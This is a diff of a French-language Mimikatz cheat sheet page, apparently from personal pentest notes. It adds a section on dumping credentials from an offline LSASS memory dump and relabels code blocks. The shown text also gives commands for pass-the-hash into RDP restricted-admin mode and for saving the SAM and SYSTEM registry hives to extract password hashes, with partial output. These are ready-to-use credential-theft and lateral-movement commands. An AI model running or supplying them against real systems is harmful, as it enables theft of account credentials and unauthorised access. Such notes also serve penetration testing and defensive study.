@@ -9,20 +9,30 @@ permalink: /Mimikatz/
 
 Repris de https://github.com/gentilkiwi/mimikatz/wiki
 
+#### Dump offline
+
+``` text
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'
+
+mimikatz # sekurlsa::logonpasswords
+Opening : 'lsass.dmp' file for minidump...
+```
+
 #### Pass the hash et RDP
-``` bash
+``` text
 privilege::debug
 sekurlsa::pth /user:heidegger /domain:SHINRA-INC /ntlm:XXXXXXXXXXXXXXXX /run:"mstsc.exe /restrictedadmin"
 ```
 
 #### Dump offline de SAM
 Récupérer SAM et system:
-```bash
+```text
 reg save HKLM\SYSTEM SystemBkup.hiv
 reg save HKLM\SAM SamBkup.hiv
 ```
 Dumper les hashs avec mimikatz:
-```bash
+```text
 mimikatz # lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
 Domain : VM-W7-ULT-X
 SysKey : 74c159e4408119a0ba39a7872e9d9a56
